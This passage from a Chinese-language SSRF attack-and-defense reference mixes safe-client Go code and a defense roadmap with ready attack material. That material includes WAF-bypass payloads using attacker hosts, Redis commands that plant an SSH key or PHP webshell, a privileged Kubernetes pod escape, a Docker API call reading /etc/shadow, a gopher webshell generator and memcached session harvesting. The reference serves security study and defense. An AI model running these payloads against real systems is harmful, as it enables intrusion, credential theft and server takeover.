	transport := &http.Transport{
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			// 解析地址
			host, port, err := net.SplitHostPort(addr)
			if err != nil {
				return nil, fmt.Errorf("invalid address: %w", err)
			}

			// 解析 IP (只解析一次，防 DNS Rebinding)
			ips, err := net.DefaultResolver.LookupIPAddr(ctx, host)
			if err != nil {
				return nil, fmt.Errorf("DNS resolution failed: %w", err)
			}

			for _, ip := range ips {
				if isBlockedIP(ip.IP) {
					return nil, fmt.Errorf("blocked IP: %s", ip.IP)
				}
				// 使用解析后的第一个合法 IP 直连
				conn, err := dialer.DialContext(ctx, network,
					net.JoinHostPort(ip.IP.String(), port))
				if err == nil {
					return conn, nil
				}
			}
			return nil, fmt.Errorf("no valid IP found for %s", host)
		},
	}

	return &SafeHTTPClient{
		allowedDomains: domainMap,
		client:         &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
			// 禁止跟随重定向
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
}

func isBlockedIP(ip net.IP) bool {
	// 检查 loopback
	if ip.IsLoopback() {
		return true
	}
	// 检查私有地址
	if ip.IsPrivate() {
		return true
	}
	// 检查 link-local (169.254.x.x / fe80::)
	if ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() {
		return true
	}
	// 检查未指定地址 (0.0.0.0 / ::)
	if ip.IsUnspecified() {
		return true
	}
	// 检查已知元数据地址
	if ip.Equal(net.ParseIP("100.100.100.200")) {
		return true
	}
	return false
}

func (c *SafeHTTPClient) SafeGet(rawURL string) (*http.Response, error) {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %w", err)
	}

	// 1. 协议白名单
	if parsed.Scheme != "https" && parsed.Scheme != "http" {
		return nil, fmt.Errorf("protocol not allowed: %s", parsed.Scheme)
	}

	// 2. 域名白名单
	hostname := parsed.Hostname()
	if !c.allowedDomains[hostname] {
		return nil, fmt.Errorf("domain not in allowlist: %s", hostname)
	}

	// 3. 发起请求 (Transport 的 DialContext 已处理 IP 验证)
	return c.client.Get(rawURL)
}
```

#### 13.4 Go 使用 safeurl 库 (Doyensec)

```go
import (
    safeurl "github.com/doyensec/safeurl-go"
)

// safeurl 内置 SSRF 和 DNS Rebinding 防护
func safeFetch(url string) (*http.Response, error) {
    client := safeurl.NewClient(
        safeurl.WithAllowedHosts("api.example.com"),
        safeurl.WithAllowedSchemes("https"),
        // 自动拒绝私有 IP、link-local、回环地址
    )
    return client.Get(url)
}
```

---

### 14. WAF 绕过矩阵

| 绕过类别 | 技术手段 | Payload 示例 | 适用场景 |
|---------|---------|-------------|---------|
| **IP 编码** | 十进制 | `http://2852039166/` | WAF 只匹配 IP 格式 |
| | 十六进制 | `http://0xa9fea9fe/` | 同上 |
| | 八进制 | `http://0249.0376.0251.0376/` | 同上 |
| | IPv6 映射 | `http://[::ffff:a9fe:a9fe]/` | WAF 不检查 IPv6 |
| **域名绕过** | nip.io | `http://169.254.169.254.nip.io/` | WAF 过滤 IP 不过滤域名 |
| | DNS Rebinding | `http://rebind.attacker.com/` | 解析后 IP 变化 |
| | 短域名 | `http://x.y/` → 302 内网 | 短链接重定向 |
| **URL 解析差异** | Fragment 注入 | `http://evil.com#@safe.com` | 解析器差异 |
| | 反斜杠 | `http://evil.com\\@safe.com` | Windows 解析差异 |
| | 空字节 | `http://evil.com%00@safe.com` | 截断差异 |
| | 双重编码 | `http://%3169%2e%3254%2e%3169%2e%3254/` | WAF 单次解码 |
| **协议走私** | HTTP/2 降级 | HTTP/2 → HTTP/1.1 走私 | 前后端版本不一致 |
| | Chunk Extensions | `Transfer-Encoding: chunked` | CVE-2025-55315 类型 |
| **重定向** | 302 跳转 | 攻击者服务器 → 302 → 内网 | WAF 只检查首次 URL |
| | Meta Refresh | `<meta http-equiv="refresh">` | 服务端渲染 HTML |
| **IPv6** | Link-Local | `http://[fe80::1]/` | WAF 不识别 IPv6 |
| | 缩写形式 | `http://[::1]/` | WAF 黑名单不完整 |
| | 映射地址 | `http://[::ffff:127.0.0.1]/` | 归一化不匹配 |
| **编码** | URL 编码 | `http://%31%36%39...` | WAF 不解码 |
| | Unicode | `http://ⓕⓘⓛⓔ:///` | Unicode 归一化 |
| **协议** | gopher:// | `gopher://127.0.0.1:6379/_...` | 应用支持非 HTTP 协议 |
| | dict:// | `dict://127.0.0.1:6379/INFO` | 同上 |
| | file:// | `file:///etc/passwd` | 同上 |

---

### 15. 更新 MITRE ATT&CK 映射

| Tactic | Technique | Sub-Technique | ID | 说明 |
|--------|-----------|---------------|-----|------|
| Initial Access | Exploit Public-Facing Application | - | T1190 | SSRF 作为入口漏洞 |
| Discovery | Remote System Discovery | - | T1018 | 通过 SSRF 探测内网 |
| Discovery | Cloud Service Discovery | - | T1580 | 通过元数据 API 发现云资源 |
| Credential Access | Unsecured Credentials | Cloud Instance Metadata API | T1552.005 | AWS/GCP/Azure 元数据凭证窃取 |
| Lateral Movement | Internal Proxying | - | T1090 | 利用 SSRF 作为内网代理 |
| Lateral Movement | Proxy Through Target | - | T1090.001 | 通过 SSRF 跳板访问内部服务 |
| Command and Execution | Remote Services | - | T1021 | 通过 gopher/dict 协议执行命令 |
| Defense Evasion | Proxy | Multi-hop Proxy | T1090.003 | 通过多层 SSRF 隐藏攻击来源 |

---

### 16. 2025-2026 重要 CVE 参考

| CVE ID | 影响产品 | 漏洞类型 | CVSS |
|--------|---------|---------|------|
| CVE-2025-61882 | Oracle E-Business Suite | SSRF → 元数据泄露 | 严重 |
| CVE-2025-54122 | Manager-io/Manager | 代理处理 SSRF | 严重 |
| CVE-2025-55315 | ASP.NET Core | HTTP 请求走私 (Chunk Extensions) | 9.9 |
| CVE-2025-66373 | Akamai | HTTP 请求走私 (Chunked Body) | 高 |
| CVE-2025-6442 | Ruby WEBrick | HTTP 请求走私 | 高 |
| CVE-2025-41082 | Altitude Server | HTTP 请求走私 | 高 |
| CVE-2026-26324 | OpenClaw | SSRF (IPv4-Mapped IPv6 绕过) | 严重 |
| GHSA-w5r7-4f94-vp4c | LibreChat | SSRF (IPv6 归一化不匹配) | 高 |

---

### 17. AI/LLM Agent SSRF 新攻击面

```
# === 2025-2026 新趋势: AI Agent SSRF ===
# LLM Agent (如 ChatGPT Plugin, Claude Tool, AutoGPT) 可发起 HTTP 请求
# 如果 Agent 接受用户输入构造 URL → SSRF

# 攻击向量:
# 1. 用户让 AI Agent 访问恶意 URL
# 2. AI Agent 的工具调用中注入 SSRF payload
# 3. Agent 框架 (LangChain, CrewAI) 的 URL 工具未做校验

# 防御: 对 AI Agent 的所有出站 HTTP 请求应用同样的 SSRF 防护
# - 白名单域名
# - DNS 解析后 IP 验证
# - 禁用非 HTTP 协议
# - 参考: https://pipelab.org/learn/preventing-ssrf-in-ai-agents/
```

---

### 18. Webhook / Image Proxy SSRF（2025）

#### 18.1 NocoDB Webhook SSRF 防护绕过（GHSA-2c5x-4jgf-88mj）

NocoDB 的 Slack/Discord/Mattermost/Teams 通知插件使用 `request-filtering-agent` 做 SSRF 防护，但 httpAgent/httpsAgent 使用错误导致**防护完全失效**。

**漏洞模式**:
```javascript
// ❌ 错误：使用 httpAgent 全局配置，绕过了 SSRF Agent
const axios = require('axios');
const agent = new ssrfAgent();
axios.post(webhookUrl, payload, {
    httpAgent: agent,   // 仅对 http:// 生效
    httpsAgent: agent,  // 仅对 https:// 生效
    // 但 axios 内部某些场景不会用 agent
});

// ✅ 正确：在每次请求时显式传入
axios.post(webhookUrl, payload, {
    agent,  // 简写形式不行，必须分开
});
```

**通用 Webhook SSRF 测试 payload**:
```
# 1. 替换 Webhook URL 为内网目标
http://169.254.169.254/latest/meta-data/
http://127.0.0.1:6379/  # Redis
http://127.0.0.1:9200/  # Elasticsearch

# 2. 利用 DNS 重绑定
http://webhook.rebind.attacker.com/

# 3. 利用 URL 解析差异
http://127.0.0.1\.attacker.com/
http://attacker.com#@127.0.0.1/
```

#### 18.2 图片代理 SSRF（高价值）

任何"用户可控 URL + 服务端获取"的功能都可能 SSRF：
- 头像上传（URL 方式）
- 链接预览（Slack/Discord/Telegram/WhatsApp）
- RSS 订阅
- PDF / DOCX 转 HTML
- 网页截图服务
- OAuth icon / App logo

**经典利用链 — Yahoo Mail $15k 赏金**:
```
1. Yahoo Mail 支持 Image Proxy 渲染邮件中的图片
2. 用户邮件中插入 <img src="http://attacker.com/gopher-test">
3. Image Proxy 获取图片时未限制协议
4. 通过 gopher:// 协议向内部 Redis 发送命令
5. Redis 持久化写入 cron → RCE
```
来源: [Just Gopher It — Yahoo Mail Blind SSRF to RCE](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)

#### 18.3 防御

- 始终在出站请求中应用 SSRF Agent
- 对每个新连接重新解析 DNS（防 DNS Rebinding）
- 限制协议仅 HTTP/HTTPS，禁用 gopher/file/dict/ftp
- 限制最大响应大小（防资源耗尽）
- 限制最大重定向次数（防重定向绕过）
- 对返回内容做 MIME 类型校验（防 HTML 注入回弹）

来源: [Convoy — Tackling SSRF in Webhook Systems](https://www.getconvoy.io/webhook-guides/tackling-ssrf)

---

### 19. ImageMagick / Ghostscript SSRF→RCE 链（2025）

#### 19.1 ImagePanick — SVG 到 RCE（2025）

[Deep Hacking — ImagePanick](https://blog.deephacking.tech/en/posts/imagepanick-from-svg-to-rce-imagemagick-ghostscript/) 披露链：
1. ImageMagick 默认 policy.xml 不够严格
2. 上传 SVG 中嵌入 PostScript
3. Ghostscript 处理 PS 时绕过 -dSAFER 沙箱
4. 实现任意文件写 → RCE

**POC SVG 框架**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="exploit.eps" width="100" height="100"/>
</svg>
```

#### 19.2 MVG / MSL — SSRF 与文件读

```
# MVG（Magick Vector Graphics）通过 url() 协议读文件
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'url(file:///etc/passwd)'

# 通过 ephemeral: 读 URL
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:/etc/passwd'

# MSL（Magick Scripting Language）执行任意操作
<?xml version="1.0" encoding="UTF-8"?>
<image size="100x100">
  <read filename="label:@/etc/passwd"/>
  <write filename="/tmp/out.png"/>
</image>
```

#### 19.3 2025 ImageMagick CVE

- **CVE-2025-53101**: 影响比最初披露更广的 ImageMagick 命令（[JFrog Research](https://research.jfrog.com/post/image-magick-cve-2025-53101/)）
- **CVE-2025-55154**: ReadOneMNGImage 内存破坏（[ZeroPath](https://zeropath.com/blog/imagemagick-cve-2025-55154)）
- **CVE-2025-68618**: SVG 文件 DoS（[SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-68618/)）
- **Hadrian.io 零日研究**: 单个 jpg/pdf 可在主流 Linux 发行版默认 ImageMagick 上写 /tmp/（[Hadrian.io](https://hadrian.io/blog/imagemagick-zero-days-bypass-multiple-security-policies-what-defenders-need-to-know)）

#### 19.4 防御

```xml
<!-- /etc/ImageMagick-7/policy.xml 严格配置 -->
<policymap>
  <policy domain="delegate" rights="none" pattern="*" />
  <policy domain="coder" rights="none" pattern="*PS*" />
  <policy domain="coder" rights="none" pattern="*PDF*" />
  <policy domain="coder" rights="none" pattern="*XPS*" />
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="SVG" />
  <policy domain="path" rights="none" pattern="@*" />
</policymap>
```

**额外措施**:
- 默认禁用 Ghostscript delegate
- 升级 Ghostscript ≥ 10.04（修复 -dSAFER 绕过）
- 沙盒化 ImageMagick 进程（AppArmor / firejail）
- 对上传图片用 `identify -verbose` 检测可疑元数据

---

### 20. SSRF + Web Cache Poisoning 链（2025）

#### 20.1 CVE-2025-4366 — Pingora Request Smuggling

[ZeroPath — CVE-2025-4366 分析](https://zeropath.com/blog/cve-2025-4366-pingora-request-smuggling)：
- Cloudflare Pingora 反向代理的 HTTP/2 → HTTP/1.1 降级走私
- 通过构造特殊的 Chunk Extensions，前后端解析不一致
- 可在 CDN 边缘污染缓存，向任意用户提供恶意内容

**SSRF + Smuggling 组合**:
```
1. SSRF 端点可指定后端 URL
2. 通过 SSRF 注入走私请求
3. 走私请求污染缓存键
4. 后续用户访问 /api/me 时获得攻击者注入的内容
```

#### 20.2 Next.js Cache Chain（2025）

[zhero_web_security — Next.js Cache Chain](https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir)：
- Next.js ISR 缓存键设计缺陷
- URL 参数差异被忽略
- 配合 SSRF 可强制缓存恶意页面

#### 20.3 SSRF → Cache Deception

```
# 用户访问 /profile.jpg
# 1. Cache 视其为静态资源 (.jpg) → 缓存
# 2. Origin 视其为 /profile → 返回用户敏感数据
# 3. 攻击者后续访问同一 URL 获取缓存中的他人数据
#
# SSRF 升级: 通过 SSRF 控制受害者访问任意路径
#            强制缓存任意敏感页面
```

来源: [HideAndSec — Cache Poisoning + SSRF Cheat Sheet](https://hideandsec.sh/books/web-03c/export/pdf)

---

### 21. SSRF → RCE 实战链（2025-2026）

#### 21.1 盲 SSRF → RCE 标准链（Gopher 协议）

**Assetnote Glossary of Blind SSRF Chains** — [assetnote.io](https://www.assetnote.io/resources/research/a-glossary-of-blind-ssrf-chains)：

```
SSRF (盲) → gopher:// → Redis 未授权 → 写 cron / SSH key / Webshell → RCE
                     → Memcached → 反序列化 → RCE
                     → FastCGI → PHP eval → RCE
                     → MySQL → UDF 提权 → RCE
                     → SMTP → 发钓鱼邮件
                     → Elasticsearch → Groovy 脚本 → RCE
                     → Kubernetes API → 创建恶意 Pod → RCE
```

#### 21.2 Redis 持久化 RCE 三连

```bash
# 方式 1: 写 cron (Linux)
gopherus --exploit redis
> 输入目标 IP:port
> 选择 "Reverse Shell" 输入 /bin/sh 反弹命令
> 输出 gopher payload

# 方式 2: 写 SSH key
redis-cli -h target flushall
cat ~/.ssh/id_rsa.pub > /tmp/key.txt
redis-cli -h target -x set ssh_key < /tmp/key.txt
redis-cli -h target config set dir /root/.ssh/
redis-cli -h target config set dbfilename authorized_keys
redis-cli -h target save
# 然后 ssh root@target

# 方式 3: 写 Webshell
redis-cli -h target config set dir /var/www/html/
redis-cli -h target config set dbfilename shell.php
redis-cli -h target set payload "<?php system($_GET['c']); ?>"
redis-cli -h target save
```

#### 21.3 Kubernetes API SSRF → RCE

```
# 假设 SSRF 可访问 http://10.0.0.1:6443 (K8s API Server)
# 且 ServiceAccount token 已泄露或可读

# 创建特权 Pod 反弹 shell
cat <<EOF | kubectl --token=<token> --server=https://10.0.0.1:6443 \
  --insecure-skip-tls-verify apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pwn
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: shell
    image: alpine
    command: ["nsenter", "--target", "1", "--mount", "--", "/bin/sh"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
```

#### 21.4 SSRF → Docker API → RCE

```bash
# Docker socket 暴露在内网 (2375/2376)
# 通过 SSRF 调用 Docker API 创建特权容器

curl -X POST "http://127.0.0.1:2375/containers/create" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["cat", "/host/etc/shadow"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/host"]
    }
  }'
```

来源: [Resecurity — Blind SSRF to RCE](https://www.resecurity.com/es/blog/article/blind-ssrf-to-rce-vulnerability-exploitation)

---

### 22. Serverless / Edge / CDN Origin SSRF（2025 新攻击面）

#### 22.1 Serverless 函数 SSRF

AWS Lambda / Azure Functions / Google Cloud Functions 中：
- 函数运行时**没有 IMDS 元数据**（Lambda 的执行环境特殊）
- 但**仍可访问 VPC 内网**（如果配置了 VPC）
- 可访问同区域 S3 / DynamoDB 等服务端点

**Lambda 内部探测**:
```python
# Lambda 函数中的 SSRF payload
import urllib.request
# Lambda 没有 169.254.169.254 元数据
# 但有 Lambda Runtime API:
urllib.request.urlopen('http://169.254.169.254/')  # ❌ 在 Lambda 中无效
urllib.request.urlopen('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')  # ✅ Lambda API
```

#### 22.2 CDN Origin IP SSRF

```
# CDN (Cloudflare/CloudFront) 通常通过回源访问 Origin Server
# 如果攻击者能控制 Origin Header 或 Host Header:
# Origin: http://internal-service:8080/
# 配合 SSRF 可访问 CDN 后面的内部服务
```

#### 22.3 Edge Function (Cloudflare Workers / Vercel Edge)

```javascript
// Cloudflare Worker 中发起 fetch() 默认不经过 Worker 自身
// 但可被配置成经过——可造成无限循环或 SSRF

addEventListener('fetch', event => {
    const url = new URL(event.request.url);
    // ❌ 漏洞：fetch 用户控制的 URL
    event.respondWith(fetch(url.searchParams.get('target')));
});
```

---

### 23. safeurl 库与已知绕过（2025）

#### 23.1 Doyensec safeurl — Go/Java SSRF 防护库

[safeurl GitHub](https://github.com/doyensec/safeurl) 提供：
- Go: 替代 `net/http.Client`
- Java: 替代 `java.net.HttpURLConnection` / Apache HttpClient
- 自动校验 IP 是否为私有/内网
- 防 DNS Rebinding（每次请求重新解析）

**Go 使用示例**:
```go
package main
import (
    "net/http"
    "github.com/doyensec/safeurl-go"
)

func main() {
    cfg := safeurl.Config{
        AllowPrivateIPs: false,
        MaxRedirects:    3,
        // ... 配置
    }
    client := safeurl.NewClient(cfg)

    resp, err := client.Get("https://example.com/api")
    // 自动阻止访问内网 IP
}
```

#### 23.2 已知绕过 — Cross-Protocol Redirect（CVE 类型）

[Doyensec Blog — SSRF Remediation Bypass](https://blog.doyensec.com/2023/03/16/ssrf-remediation-bypass.html)：

```python
# 攻击场景:
# 1. safeurl 允许 https://attacker.com
# 2. attacker.com 返回 302 重定向到 gopher://...
# 3. safeurl 部分版本未校验重定向后的协议
# 4. 最终发起 gopher 请求 → SSRF 升级 RCE

# 防御升级: safeurl 已修复，强制 HTTPS→HTTPS、HTTP→HTTP 重定向
# 但用户必须升级到最新版本
```

#### 23.3 SSRF 防护库对比

| 库 | 语言 | 优势 | 缺点 |
|----|------|------|------|
| [safeurl-go](https://github.com/doyensec/safeurl) | Go | Doyensec 维护 | 历史绕过 |
| [safeurl-java](https://github.com/doyensec/safeurl) | Java | 同上 | 同上 |
| [nossrf](https://www.npmjs.com/package/nossrf) | Node.js | 易用 | **CVE-2025-2691: 自身可绕过** |
| [request-filtering-agent](https://github.com/ShogunPanda/request-filtering-agent) | Node.js | 主流 | **NocoDB GHSA-2c5x-4jgf-88mj 使用错误** |
| [GetSafeURL](https://github.com/wrfly/getsafeurl) | Go | 简单 | 维护有限 |

**关键教训**: **使用了 SSRF 防护库 ≠ 安全**，必须审计实际使用方式。

---

### 24. 2025-2026 关键 CVE 补充

| CVE | 产品 | 类型 | 备注 |
|------|------|------|------|
| CVE-2025-2691 | nossrf (npm) | SSRF 防护库自身可绕过 | 主机名解析到被屏蔽地址 |
| CVE-2025-46385 | 多个 | 通用 SSRF | [SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-46385/) |
| CVE-2025-0426 | Kubernetes Kubelet | DoS | kubelet 拒绝服务 |
| CVE-2025-1767 | Kubernetes gitRepo Volume | 容器隔离缺陷 | [Red Hat](https://access.redhat.com/security/cve/cve-2025-1767) |
| CVE-2025-31133 | runc | 容器逃逸 | maskedPaths 滥用 |
| CVE-2025-23266 | NVIDIA Container Toolkit | 容器逃逸 | NVIDIAScape |
| CVE-2025-9074 | Docker Desktop (Windows) | SSRF → 完整容器逃逸 | [Reddit](https://www.reddit.com/r/netsec/comments/1mwhisp/) |
| CVE-2025-4366 | Cloudflare Pingora | HTTP 请求走私 | 缓存污染 |
| CVE-2025-53101 | ImageMagick | 内存破坏 | JFrog Research |
| CVE-2025-55154 | ImageMagick (ReadOneMNGImage) | 内存破坏 | ZeroPath |
| CVE-2025-68618 | ImageMagick SVG | DoS | SentinelOne |
| CVE-2025-61882 | Oracle EBS | 严重 SSRF | Vectra AI |
| GHSA-ch3m-6mv4-c3wh | 通用 | SSRF → 未认证 RCE | GitHub Advisory |

---

### 25. 中文社区 SSRF 精华

#### 25.1 奇安信攻防社区核心文章

- [云上的 SSRF 利用](https://mdr.skyeye.qianxin.com/forum/share/2412) — 实例 SSRF + 元数据服务全暴露
- [新型云服务安全攻防：漏洞挖掘技术与实践](https://mdr.skyeye.qianxin.com/forum/share/4633) — 169.254.x.x 链路本地地址攻击
- [网络安全一百问-24：三个 SSRF 漏洞挖掘方法](https://mdr.skyeye.qianxin.com/forum/question/697) — url= 参数 / 转发下载导入功能点

#### 25.2 火线 Zone / 阿里云 / 腾讯云

- [Cloud RedTeam 视角下元数据服务攻防实践](https://zone.huoxian.cn/d/927-cloud-redteamcny) — 红队视角实战
- [蓝军技巧之 SSRF 利用方法](https://cloud.tencent.com/developer/article/1968655) — Grafana DB 文件未授权获取
- [从云服务器 SSRF 到接管阿里云控制台](https://www.anquanke.com/post/id/274073) — 阿里云 ECS 实战

#### 25.3 长亭百川云 / 安全客

- [打破传统思维｜另一视角下的 SSRF](https://rivers.chaitin.cn/blog/cqc86d10lnedkak2p9ag) — 长亭原创
- [一次 SSRF→RCE 的艰难利用](https://www.anquanke.com/post/id/202966) — Redis 实战
- [Java 代码审计 SSRF 漏洞](https://m.freebuf.com/articles/web/455763.html) — FreeBuf 入门

---

### 26. 2025-2026 SSRF 防御升级路线图

| 层级 | 措施 | 优先级 |
|------|------|--------|
| **网络层** | IMDSv2 强制 + Hop Limit = 1 | P0 |
| **网络层** | 出站网络隔离（VPC / Security Group） | P0 |
| **网络层** | 阻止 169.254.169.254 / fd00:ec2::254 | P0 |
| **网络层** | 阻止 0.0.0.0/8、10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、127.0.0.0/8、169.254.0.0/16 | P0 |
| **网络层** | 阻止 IPv4-Mapped IPv6（::ffff:0:0/96） | P0 |
| **应用层** | URL 白名单 + 域名校验 | P0 |
| **应用层** | DNS 解析后 IP 校验（一次性解析） | P0 |
| **应用层** | 限制协议（仅 HTTP/HTTPS） | P0 |
| **应用层** | 限制最大重定向次数 + 协议一致 | P1 |
| **应用层** | 使用 safeurl-go / safeurl-java（最新版） | P1 |
| **应用层** | Webhook 接收方严格 SSRF Agent | P0 |
| **应用层** | ImageMagick 严格 policy.xml + 禁用 Ghostscript | P0 |
| **云层** | AWS IMDSv2 + Hop Limit 1 | P0 |
| **云层** | GCP Workload Identity 替代 SA Token | P1 |
| **云层** | Azure Managed Identity + 严格 RBAC | P1 |
| **K8s** | NetworkPolicy 限制 Pod 出站 | P0 |
| **K8s** | ServiceAccount Token 自动挂载禁用（如非必要） | P1 |
| **K8s** | 限制 gitRepo / hostPath / privileged | P0 |
| **检测** | 出站请求日志（VPC Flow Logs + 应用层） | P1 |
| **检测** | 异常 User-Agent / 内网目标告警 | P2 |
| **AI Agent** | 所有 Agent 出站 HTTP 应用相同防护 | P0 |

---

### 27. 参考资源更新

- [PortSwigger — SSRF Reference](https://portswigger.net/web-security/ssrf)
- [OWASP — SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Assetnote — A Glossary of Blind SSRF Chains](https://www.assetnote.io/resources/research/a-glossary-of-blind-ssrf-chains)
- [Just Gopher It — Yahoo Mail $15k SSRF to RCE](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
- [Resecurity — Blind SSRF to RCE Exploitation](https://www.resecurity.com/es/blog/article/blind-ssrf-to-rce-vulnerability-exploitation)
- [Doyensec — safeurl GitHub](https://github.com/doyensec/safeurl)
- [Doyensec — SSRF Remediation Bypass](https://blog.doyensec.com/2023/03/16/ssrf-remediation-bypass.html)
- [NocoDB Webhook SSRF GHSA-2c5x-4jgf-88mj](https://github.com/nocodb/nocodb/security/advisories/GHSA-2c5x-4jgf-88mj)
- [Slack SSRF $10k Bypass](https://infosecwriteups.com/bypassing-ssrf-protections-a-10-000-lesson-from-slack-6cff022a44a6)
- [Convoy — Tackling SSRF in Webhook Systems](https://www.getconvoy.io/webhook-guides/tackling-ssrf)
- [Deep Hacking — ImagePanick SVG to RCE](https://blog.deephacking.tech/en/posts/imagepanick-from-svg-to-rce-imagemagick-ghostscript/)
- [Hadrian.io — ImageMagick Zero-Days 2025](https://hadrian.io/blog/imagemagick-zero-days-bypass-multiple-security-policies-what-defenders-need-to-know)
- [JFrog — CVE-2025-53101](https://research.jfrog.com/post/image-magick-cve-2025-53101/)
- [ZeroPath — CVE-2025-4366 Pingora Smuggling](https://zeropath.com/blog/cve-2025-4366-pingora-request-smuggling)
- [zhero_web_security — Next.js Cache Chain](https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir)
- [HideAndSec — Web Attacks Cheat Sheet](https://hideandsec.sh/books/web-03c/export/pdf)
- [Intigriti — SSRF Complete Guide](https://www.intigriti.com/researchers/blog/hacking-tools/ssrf-a-complete-guide-to-exploiting-advanced-ssrf-vulnerabilities)
- [Vectra AI — SSRF Attacks & Prevention](https://www.vectra.ai/topics/server-side-request-forgery)
- [LastPass — SSRF Attacks Up 452%](https://blog.lastpass.com/posts/server-side-request-forgery)
- [奇安信攻防社区 — 云上的 SSRF 利用](https://mdr.skyeye.qianxin.com/forum/share/2412)
- [奇安信 — 新型云服务安全攻防](https://mdr.skyeye.qianxin.com/forum/share/4633)
- [火线 Zone — Cloud RedTeam 元数据服务攻防](https://zone.huoxian.cn/d/927-cloud-redteamcny)
- [安全客 — SSRF 到接管阿里云控制台](https://www.anquanke.com/post/id/274073)
- [FreeBuf — SSRF 漏洞原理和利用](https://m.freebuf.com/articles/web/247868.html)
- [pipelab — Preventing SSRF in AI Agents](https://pipelab.org/learn/preventing-ssrf-in-ai-agents/)\n
## Part D：Gopher 深坑包（2026 社区实战提炼）

> 来源：奇安信攻防社区《基于Gopher协议残存攻击面的SSRF内网协议链式探测》（forum.butian.net/share/4965，
> 2026-08，实测 Docker 靶场验证）。以下六点是 gopher 利用从「能跑」到「稳定打穿」的差距所在。

### D.1 编码层数判定（payload 失败第一原因）

gopher payload 经 SSRF 端点转发时存在**两次解码**：Web 框架对参数 URL 解码一次 → curl 对 gopher 路径
URL 解码一次。要让 TCP 最终收到 `\r\n`：

```
直连 curl（单层）:  gopher://host:port/_PING%0d%0a
经 SSRF 转发（双层）: %250d%250a   ← Flask 解码得 %0d%0a，curl 再解码得 \r\n
```

- 工程化做法：外层用 `curl -sG --data-urlencode 'url=gopher://...'` 自动完成双层编码；
- 排障做法：先在宿主机 `nc -lvnp 9999` 直接看 SSRF 实际送来的字节——编码层数错不错一目了然；
- Docker 环境 SSRF 打宿主机要用网关 IP（`docker network inspect <net> | grep Gateway`），127.0.0.1 在容器内指向容器自身。

### D.2 RESP 数组格式（多命令必须）

Redis 内联格式（`PING\r\n` 空格分隔）遇第一个 `\r\n` 即截断——**单命令可用，多命令流水线必须 RESP 数组**：

```
*<参数个数>\r\n$<参数1长度>\r\n<参数1>\r\n$<参数2长度>\r\n<参数2>\r\n...
```

生成器骨架（避免手算长度出错）：

```python
def resp(cmd):
    out = f"*{len(cmd)}\r\n".encode()
    for a in cmd: out += f"${len(a)}\r\n".encode() + a.encode() + b"\r\n"
    return out
payload = b"".join(resp(c) for c in [["CONFIG","SET","dir","/var/www/html"],["CONFIG","SET","dbfilename","shell.php"],["SET","v",b"<?php system($_GET[\'c\']);?>"],["SAVE"]])
import urllib.parse; print(f"gopher://redis:6379/_{urllib.parse.quote(payload, safe=\'\')}")
```

### D.3 RDB 包裹的 webshell 为何仍能执行

Redis `SAVE` 写出的是 RDB 二进制（shell.php 是 143 字节而非 26 字节）。PHP 解析器把 `<?php` 之前的
RDB 头当 HTML 原样输出、`?>` 之后继续扫描——**只有 `<?php ... ?>` 段被执行，乱码中命令回显清晰可读**。
验证时用 `strings | grep uid` 提取而非期待干净输出。

### D.4 curl gopher 的二进制协议限制（与绕过）

curl 发送 gopher selector 时 `\x00` 被当作字符串终止符截断——**FastCGI（php-fpm 9000）与 MySQL 等二进制
协议无法经 curl gopher 构造**。绕过：SSRF 可控点若在应用代码（如自定义 fetch 服务），用 python socket
按 FastCGI 记录格式（8 字节头 + FCGI_PARAMS 键值对）组包直连；FastCGI 直打的 RCE 关键是
`PHP_VALUE` 注入 `auto_prepend_file=php://input`。

### D.5 盲 SSRF 时间探测（无回显判活）

无回显时按服务**响应延迟差**判内网端口存活：对 [21,22,80,443,3306,6379,9000,11211] 等逐端口
发 gopher 探针，开放端口（有协议栈握手等待）与关闭端口（立即 RST）的响应时间存在稳定差；
Banner 触发型（HTTP/FTP/SMTP）直接看回显，**等待型服务**（Redis/MySQL/Memcached）靠时间差 +
`%0d%0a` 探针（如 `PING\r\n` 的 `+PONG`）。

### D.6 Memcached 链与 session 收割

gopher 打 memcached：`stats\r\n`（版本/键数）→ `stats items\r\n`（slab 枚举）→
`get <key>\r\n` 取值。实战要点：**PHP session 默认落 memcached 的键名 `memc.sess.key.*`**——
读到活跃会话即等同拿到在线用户会话凭据（配合目标 web 路径验证 session 有效性）。

### D.7 来源

- [奇安信攻防社区 — 基于Gopher协议残存攻击面的SSRF内网协议链式探测](https://forum.butian.net/share/4965)
